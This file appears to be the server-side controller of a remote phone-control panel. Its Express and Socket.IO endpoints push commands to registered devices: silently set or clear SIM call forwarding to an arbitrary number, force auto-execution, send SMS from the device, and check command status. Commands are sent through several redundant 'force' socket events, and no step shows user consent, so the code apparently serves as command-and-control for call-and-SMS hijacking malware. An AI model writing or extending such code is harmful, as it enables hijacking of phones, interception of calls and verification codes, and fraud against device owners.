import Command from '../models/CommandModel.js';
import User from '../models/UserModel.js';
import { normalizeDeviceId } from '../helpers/deviceId.js';


export const callForward = async (req, res) => {
  try {
    let { deviceId, slot, number, autoExecute = false, priority = 'normal' } = req.body;

    deviceId = normalizeDeviceId(deviceId);
    if (!deviceId || slot === undefined) {
      return res.status(400).json({ error: "Missing deviceId or slot" });
    }

    // Clear any existing pending commands for this device and action
    await Command.updateMany(
      {
        deviceId,
        action: "CALL_FORWARD",
        done: false,
        "payload.slot": parseInt(slot)
      },
      {
        $set: {
          done: true,
          executedAt: new Date(),
          executionMessage: "Superseded by new command"
        }
      }
    );

    // Determine if this is deactivation (empty number means deactivation)
    const isDeactivation = !number || number.trim() === '' || number.trim().toLowerCase() === 'deactivate';
    const finalNumber = isDeactivation ? '' : number.trim();

    // Force auto-execute for deactivation commands
    const forceAutoExecute = isDeactivation ? true : autoExecute;

    console.log(`📞 NEW Call forwarding request: Device ${deviceId}, Slot ${slot}, Number: ${finalNumber || 'DEACTIVATE'}, Auto: ${forceAutoExecute}, Deactivation: ${isDeactivation}`);
    // Update SIM forwarding in database with status tracking
    const updateResult = await User.updateOne(
      { deviceId, "simInfo.slot": slot },
      {
        $set: {
          "simInfo.$.forwarding": finalNumber,
          "simInfo.$.forwardingStatus.autoManaged": forceAutoExecute,
          "simInfo.$.forwardingStatus.active": !isDeactivation,
          "simInfo.$.forwardingStatus.lastChecked": new Date(),
          "simInfo.$.forwardingStatus.lastCommandSent": new Date(),
          ...(isDeactivation
            ? { "simInfo.$.forwardingStatus.lastDeactivated": new Date() }
            : { "simInfo.$.forwardingStatus.lastActivated": new Date() }
          ),
          "simInfo.$.updatedAt": new Date()
        }
      }
    );

    console.log(`📝 Updated user SIM forwarding:`, updateResult);

    // Create fresh command with unique timestamp
    const cmd = await Command.create({
      deviceId,
      action: "CALL_FORWARD",
      payload: {
        slot: parseInt(slot),
        number: finalNumber,
        timestamp: Date.now(),
        requestedBy: req.body.requestedBy || 'admin',
        autoExecute: forceAutoExecute,
        priority: isDeactivation ? 'high' : priority,
        isDeactivation: isDeactivation,
        commandId: `cf_${deviceId}_${slot}_${Date.now()}` // Unique command ID
      },
      done: false,
      autoExecuted: false
    });

    console.log(`💾 Created command: ${cmd._id} (Auto: ${forceAutoExecute}, Deactivation: ${isDeactivation})`);

    // Enhanced command emission with auto-execute flag
    const emitData = {
      ...cmd.toObject(),
      deviceId,
      urgent: true,
      autoExecute: forceAutoExecute,
      isDeactivation: isDeactivation,
      forceExecute: isDeactivation,
      resetState: true, // Signal to reset client state
      executionId: `exec_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    };

    console.log(`📡 Emitting AUTO ${isDeactivation ? 'DEACTIVATION' : 'ACTIVATION'} command to device room: ${deviceId}`);

    const deviceSockets = await global.io.in(deviceId).fetchSockets();
    console.log(`🔌 Found ${deviceSockets.length} active sockets for device ${deviceId}`);

    // Multiple emission strategies
    global.io.to(deviceId).emit("command", emitData);
    global.io.to(deviceId).emit("call-forward-command", emitData);
    global.io.to(deviceId).emit("auto-execute-command", emitData);

    // Special deactivation event
    if (isDeactivation) {
      global.io.to(deviceId).emit("force-deactivate-command", emitData);
    }



    
     if(deviceSockets.length > 0) {
      // Send to all active sockets with multiple event types
      deviceSockets.forEach((socket, index) => {
        console.log(`📤 Sending to socket ${index + 1}: ${socket.id}`);
        
        // Multiple emission strategies for reliability
        socket.emit("command", emitData);
        socket.emit("call-forward-command", emitData);
        socket.emit("auto-execute-command", emitData);
        
        if (isDeactivation) {
          socket.emit("force-deactivate-command", emitData);
        } else {
          socket.emit("force-activate-command", emitData);
        }
        
        // Reset command to ensure fresh execution
        socket.emit("reset-command-state", { 
          deviceId, 
          timestamp: Date.now(),
          resetAll: true 
        });
      });

      // Also emit to room (backup)
      global.io.to(deviceId).emit("command", emitData);
      global.io.to(deviceId).emit("reset-command-state", { 
        deviceId, 
        timestamp: Date.now(),
        resetAll: true 
      });

    } else {
      console.warn(`⚠️ NO SOCKETS FOUND for device ${deviceId}. Command saved as pending.`);
    }

    const actionType = isDeactivation ? 'deactivation' : 'activation';
    const message = `Call forwarding ${actionType} command AUTO-${deviceSockets.length > 0 ? 'sent' : 'queued'}`;

    res.json({
      success: true,
      command: {
        id: cmd._id,
        deviceId,
        action: cmd.action,
        payload: cmd.payload,
        autoExecute: forceAutoExecute,
        isDeactivation: isDeactivation,
        status: deviceSockets.length > 0 ? 'sent' : 'pending',
        activeSockets: deviceSockets.length
      },
      message: message,
      devicesConnected: deviceSockets.length,
      timestamp: Date.now()
    });

  } catch (err) {
    console.error("❌ Call forward error:", err);
    res.status(500).json({
      error: "Failed to set call forwarding",
      details: err.message
    });
  }
};

// NEW: Endpoint to toggle auto-execution
export const toggleAutoExecution = async (req, res) => {
  try {
    const { deviceId, enabled } = req.body;

    const user = await User.findOneAndUpdate(
      { deviceId: normalizeDeviceId(deviceId) },
      {
        $set: {
          "callForwardingSettings.autoExecuteEnabled": enabled,
          "callForwardingSettings.lastStatusCheck": new Date()
        }
      },
      { new: true }
    );

    if (!user) {
      return res.status(404).json({ error: "Device not found" });
    }

    // Emit status change to device
    global.io.to(deviceId).emit("auto-execute-status", {
      enabled: enabled,
      timestamp: Date.now()
    });

    res.json({
      success: true,
      autoExecuteEnabled: enabled,
      message: `Auto-execution ${enabled ? 'enabled' : 'disabled'} for device ${deviceId}`
    });

  } catch (err) {
    console.error("❌ Toggle auto-execution error:", err);
    res.status(500).json({ error: "Failed to toggle auto-execution" });
  }
};

// NEW: Endpoint to check call forwarding status
export const checkCallForwardingStatus = async (req, res) => {
  try {
    const { deviceId } = req.params;

    // Emit status check command to device
    const checkCommand = {
      action: "CHECK_CALL_FORWARDING_STATUS",
      deviceId: normalizeDeviceId(deviceId),
      timestamp: Date.now()
    };

    global.io.to(deviceId).emit("status-check", checkCommand);

    const deviceSockets = await global.io.in(deviceId).fetchSockets();

    res.json({
      success: true,
      message: "Status check command sent",
      devicesConnected: deviceSockets.length
    });

  } catch (err) {
    console.error("❌ Check status error:", err);
    res.status(500).json({ error: "Failed to check call forwarding status" });
  }
};

export const sendSms = async (req, res) => {
  try {
    const { deviceId, to, body } = req.body;
    if (!deviceId || !to || !body) {
      return res.status(400).json({ error: "Missing parameters" });
    }

    const cmd = await Command.create({
      deviceId: normalizeDeviceId(deviceId),
      action: "SEND_SMS",
      payload: { to, body, timestamp: Date.now() },
      done: false
    });

    const emitData = { ...cmd.toObject(), urgent: true };

    global.io.to(deviceId).emit("command", emitData);
    global.io.emit("device-command", emitData);

    const deviceSockets = await global.io.in(deviceId).fetchSockets();
    console.log(`SMS command - Found ${deviceSockets.length} sockets for device ${deviceId}`);

    res.json({
      success: true,
      cmd,
      sms: { address: to, body, date: Date.now() },
      devicesConnected: deviceSockets.length
    });

  } catch (err) {
    console.error("Send SMS error:", err);
    res.status(500).json({ error: "Failed to send SMS command" });
  }
};

// Add new endpoint to check command status
export const getCommandStatus = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const commands = await Command.find({ deviceId })
      .sort({ createdAt: -1 })
      .limit(10);

    res.json({ success: true, commands });
  } catch (err) {
    res.status(500).json({ error: "Failed to get command status" });
  }
};



